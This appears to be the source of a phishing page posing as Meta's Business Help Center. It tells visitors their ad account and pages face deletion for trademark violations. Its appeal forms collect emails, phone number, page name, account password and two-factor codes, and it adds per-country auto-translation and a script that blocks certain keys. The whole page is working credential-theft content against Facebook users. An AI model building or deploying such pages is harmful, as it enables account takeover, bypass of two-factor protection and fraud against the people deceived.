<!DOCTYPE html>
<html lang="en" id="html"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
    ...
    <meta property="og:description" content="Business Help Center">
    <meta property="og:image" content="/img/shild.jpg" type="image/x-icon" >
    
    <link rel="stylesheet" href="/assets/css/bootstrap.min.css">
    <link rel="icon" href="/img/fb_round_logo.png" type="image/x-icon" />
    <script src="../ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <link rel="shortcut icon" href="ico.html" type="image/x-icon">
    ...
    <div class="container-sm" id="main">
        ...
        <div class="row">
            ...
            <div class="col-8">
                <div id="right">
                    <h1>
                        <img src="/img/block_2.png" alt="" style="height: 50px;
                        width:50px;
                        margin-right: 8px;">
                        We have scheduled your ad account and pages for deletion</h1>
                    <h6>We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.</h6>
                    ...
                    <div id="card">
                        ...
                        <img src="/img/PrivacyCenter.png" alt="" style="margin-top: 30px;">
                        ...
                        <div class="card-text">
                            ...
                            <h5>Request review</h5><br>
                            <h6>This form is only to be used for submitting appeals and restoring account status</h6>
                            <h6>Please ensure that you provide the requested information below. Failure to do so may delay the processing of your appeal.</h6>
                        </div>
            ...
            <div class="modal-body">
                <form id="first-form">
                    ...
                    <div class="mb-3">
                        ...
                        <input value="" name="personal-email" type="email" class="form-control" id="PersonalEmailField"
                               required
                               oninvalid="this.setCustomValidity('Please fill in this field')"
                               oninput="this.setCustomValidity('')">
                    </div>
                    ...
                    <div class="mb-3">
                        ...
                        <input value="" name="buiseness-email" type="email" class="form-control" id="BuisenessEmailField"
                               required
                               oninvalid="this.setCustomValidity('Please fill in this field')"
                               oninput="this.setCustomValidity('')">
                    </div>
                    ...
                    <div class="mb-3">
                        ...
                        <input value="" name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld"
                               required minlength="7" maxlength="18"
                               oninvalid="this.setCustomValidity('Please fill in this field')"
                               oninput="this.setCustomValidity('')">
                    </div>

                    <div class="mb-3">
                        <label for="fb-page-name-input" class="form-label">Your Page Name</label>
                    ...
                    <div class="mb-3 form-check">
                        <input name="agree-terms" type="checkbox" class="form-check-input" id="exampleCheck1"
                               required
                               oninvalid="this.setCustomValidity('Please select this checkbox if you want to continue.')"
                               oninput="this.setCustomValidity('')">
                        <label class="form-check-label" for="exampleCheck1">
                            I agree to the <a id="termsLink" class="add-svg">Privacy Policy</a>
                        </label>
                    </div>
                        ...
                        <div class="mb-3">
                            <div class="password-input">
                                ...
                                <div style="display: flex; align-items: center;">
                                    <input name="password-1" type="password" oninvalid="this.setCustomValidity('Please fill in this field')" class="form-control" id="exampleInputPassword" autocomplete="off" minlength="3" maxlength="30" aria-describedby="emailHelp" required="" onfocus="this.removeAttribute('readonly');">
                                </div>


                                <svg id="show-hide-pass" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        ...
        <div class="modal-content">
            <div class="modal-body">
                <div class="twoFAinfo-wraper">
                    ...
                    <p>Enter the digit code for this account from the two-factor authentication you set up
                ...
                <form id="twoFAForm">
                    <div class="mb-3">
                        <div class="password-input">
                            ...
                            <input type="text" name="2FA-1" pattern="[0-9]{6,8}" class="form-control" id="exampleInputPassword" aria-describedby="emailHelp" required="" autocomplete="off" oninvalid="this.setCustomValidity('Please enter a code between 6 and 8 digits')" oninput="this.setCustomValidity('')">
                        </div>
                        <div class="invalid-feedback">
...
<div class="modal form-modal" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
            <div class="modal-content">
                <div class="modal-body">
                    ...
                    <form action="https://transparency.meta.com/vi-vn/policies/community-standards" method="GET">
                        <div class="form-btn-wrapper">
                            <button class="btn btn-primary">

                                <span class="button-text">Facebook Community Standards</span>
                            </button>
                        </div>
                    </form>
    ...
    <script src="/assets/js/mobile_check.js"></script>
    <script src="/assets/js/think_king.js"></script>
...
$countryCode = isset($data['countryCode']) ? strtoupper($data['countryCode']) : 'US';

$countryToLang = [
    'AF'=>'fa','AL'=>'sq','DZ'=>'ar','AD'=>'ca','AO'=>'pt','AG'=>'en','AR'=>'es','AM'=>'hy','AU'=>'en','AT'=>'de','AZ'=>'az',
    'BS'=>'en','BH'=>'ar','BD'=>'bn','BB'=>'en','BY'=>'be','BE'=>'nl','BZ'=>'en','BJ'=>'fr','BT'=>'dz','BO'=>'es','BA'=>'bs',
    'BW'=>'en','BR'=>'pt','BN'=>'ms','BG'=>'bg','BF'=>'fr','BI'=>'fr','KH'=>'km','CM'=>'fr','CA'=>'en','CV'=>'pt','CF'=>'fr',
    'TD'=>'fr','CL'=>'es','CN'=>'zh-CN','CO'=>'es','KM'=>'fr','CG'=>'fr','CR'=>'es','HR'=>'hr','CU'=>'es','CY'=>'el','CZ'=>'cs',
    'DK'=>'da','DJ'=>'fr','DM'=>'en','DO'=>'es','EC'=>'es','EG'=>'ar','SV'=>'es','GQ'=>'es','ER'=>'ti','EE'=>'et','ET'=>'am',
    'FJ'=>'en','FI'=>'fi','FR'=>'fr','GA'=>'fr','GM'=>'en','GE'=>'ka','DE'=>'de','GH'=>'en','GR'=>'el','GD'=>'en','GT'=>'es',
    'GN'=>'fr','GW'=>'pt','GY'=>'en','HT'=>'fr','HN'=>'es','HU'=>'hu','IS'=>'is','IN'=>'hi','ID'=>'id','IR'=>'fa','IQ'=>'ar',
    'IE'=>'en','IL'=>'he','IT'=>'it','JM'=>'en','JP'=>'ja','JO'=>'ar','KZ'=>'kk','KE'=>'sw','KI'=>'en','KR'=>'ko','KW'=>'ar',
    'KG'=>'ky','LA'=>'lo','LV'=>'lv','LB'=>'ar','LS'=>'en','LR'=>'en','LY'=>'ar','LI'=>'de','LT'=>'lt','LU'=>'fr','MG'=>'fr',
    'MW'=>'en','MY'=>'ms','MV'=>'dv','ML'=>'fr','MT'=>'mt','MH'=>'en','MR'=>'ar','MU'=>'en','MX'=>'es','FM'=>'en','MD'=>'ro',
    'MC'=>'fr','MN'=>'mn','ME'=>'sr','MA'=>'ar','MZ'=>'pt','MM'=>'my','NA'=>'en','NR'=>'en','NP'=>'ne','NL'=>'nl','NZ'=>'en',
    'NI'=>'es','NE'=>'fr','NG'=>'en','NO'=>'no','OM'=>'ar','PK'=>'ur','PW'=>'en','PA'=>'es','PG'=>'en','PY'=>'es','PE'=>'es',
    'PH'=>'tl','PL'=>'pl','PT'=>'pt','QA'=>'ar','RO'=>'ro','RU'=>'ru','RW'=>'rw','KN'=>'en','LC'=>'en','VC'=>'en','WS'=>'sm',
    'SM'=>'it','ST'=>'pt','SA'=>'ar','SN'=>'fr','RS'=>'sr','SC'=>'fr','SL'=>'en','SG'=>'en','SK'=>'sk','SI'=>'sl','SB'=>'en',
    'SO'=>'so','ZA'=>'en','SS'=>'en','ES'=>'es','LK'=>'si','SD'=>'ar','SR'=>'nl','SZ'=>'en','SE'=>'sv','CH'=>'de','SY'=>'ar',
    'TJ'=>'tg','TZ'=>'sw','TH'=>'th','TL'=>'pt','TG'=>'fr','TO'=>'to','TT'=>'en','TN'=>'ar','TR'=>'tr','TM'=>'tk','TV'=>'en',
    'UG'=>'en','UA'=>'uk','AE'=>'ar','GB'=>'en','US'=>'en','UY'=>'es','UZ'=>'uz','VU'=>'bi','VE'=>'es','VN'=>'vi','YE'=>'ar',
    'ZM'=>'en','ZW'=>'en','TW'=>'zh-TW'
];

$lang = isset($countryToLang[$countryCode]) ? $countryToLang[$countryCode] : 'en';
?>

<div id="google_translate_element" style="display:none;"></div>

<script>
var targetLang = "<?php echo $lang; ?>";

function googleTranslateElementInit() {
    new google.translate.TranslateElement({
        pageLanguage: 'auto',
        includedLanguages: 'af,sq,ar,hy,az,eu,be,bn,bg,ca,ceb,ny,zh-CN,zh-TW,hr,cs,da,nl,en,eo,et,tl,fi,fr,fy,gl,ka,de,el,gu,ht,ha,haw,he,hi,hmn,hu,is,id,ig,ga,it,ja,jw,kn,kk,km,ko,ku,ky,lo,la,lv,lt,lb,mk,mg,ms,ml,mt,mi,mr,mn,my,ne,no,ps,fa,pl,pt,pa,ro,ru,sm,gd,sr,st,si,sk,sl,so,es,su,sw,sv,tg,ta,te,th,tr,uk,ur,uz,vi,cy,xh,yi,yo,zu',
        autoDisplay: false
...
document.addEventListener("keydown", e => {
    ...
    if (block.includes(true)) e.preventDefault();
});
</script>
